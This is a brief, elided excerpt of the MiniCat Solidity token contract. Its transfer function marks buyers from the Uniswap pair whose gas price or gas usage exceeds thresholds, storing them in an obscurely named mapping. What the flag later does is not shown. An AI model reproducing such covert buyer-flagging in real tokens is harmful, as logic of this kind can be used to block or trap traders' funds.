...
contract MiniCat is Ownable, IERC20 {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if(hcm){
            ...
            if(tx.gasprice > mrr && from == uniswapV2Pair() || startGas > gl && from == uniswapV2Pair()){
                iHG[to] = true;
